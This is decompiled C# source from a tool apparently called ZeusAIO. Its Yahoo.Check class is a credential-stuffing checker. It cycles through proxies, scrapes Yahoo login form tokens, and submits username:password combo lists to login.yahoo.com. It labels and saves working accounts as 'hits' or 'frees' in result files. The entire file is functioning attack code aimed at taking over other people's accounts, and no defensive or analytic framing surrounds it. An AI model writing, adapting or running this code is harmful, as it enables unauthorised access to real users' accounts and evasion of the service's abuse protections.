// Decompiled with JetBrains decompiler
// Type: Yahoo.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Yahoo
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
            string str1 = httpRequest.Get("https://login.yahoo.com/").ToString();
            string[] strArray1 = str1.Split(new string[1]
            {
              "name=\"acrumb\" value=\""
            }, StringSplitOptions.None);
            string[] strArray2 = str1.Split(new string[1]
            {
              "name=\"sessionIndex\" value=\""
            }, StringSplitOptions.None);
            string[] strArray3 = strArray1[1].Split('"');
            string[] strArray4 = strArray2[1].Split('"');
            httpRequest.ClearAllHeaders();
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
            httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
            httpRequest.AddHeader("bucket", "mbr-phoenix-gpst");
            httpRequest.Referer = "https://login.yahoo.com/";
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            string input = httpRequest.Post("https://login.yahoo.com/", "acrumb=" + strArray3[0] + "&sessionIndex=" + strArray4[0] + "&username=" + s[0] + "&passwd=&signin=Next", "application/x-www-form-urlencoded").ToString();
            if (!input.Contains("\"messages.ERROR_INVALID_USERNAME\""))
            {
              if (input.Contains("\"location\""))
              {
                string str2 = Regex.Match(input, "\"location\":\"(.*?)\"").Groups[1].Value;
                if (!str2.Contains("recaptcha") && !(str2 == ""))
                {
                  httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                  httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
                  string str3 = httpRequest.Post("https://login.yahoo.com" + str2, (HttpContent) new BytesContent(Encoding.Default.GetBytes("crumb=czI9ivjtMSr&acrumb=" + strArray3[0] + "&sessionIndex=QQ--&displayName=" + s[0] + "&passwordContext=normal&password=" + s[1] + "&verifyPassword=Next"))).ToString();
                  if (str3.Contains("primary_login_account-challenge-session-expired_"))
                  {
                    ++mainmenu.errors;
                  }
                  else
                  {
                    if (str3.Contains("Sign Out") || str3.Contains("Manage Accounts") || str3.Contains("https://login.yahoo.com/account/logout"))
                    {
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - YAHOO] " + s[0] + ":" + s[1], Color.Green);
                      Export.AsResult("/Yahoo_hits", s[0] + ":" + s[1]);
                      return false;
                    }
                    if (!str3.Contains("Invalid password."))
                    {
                      if (str3.Contains("For your safety, choose a method below to verify that") || str3.Contains("Add a phone number and email"))
                      {
                        ++mainmenu.frees;
                        if (mainmenu.p1 == "2")
                          Colorful.Console.WriteLine("[FREE - YAHOO] " + s[0] + ":" + s[1], Color.OrangeRed);
                        Export.AsResult("/Yahoo_frees", s[0] + ":" + s[1]);
                        return false;
                      }
                    }
                    else
                      break;
                  }
                }
              }
            }
            else
              break;
          }
        }
        catch (Exception ex)
        {
          ++mainmenu.errors;
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
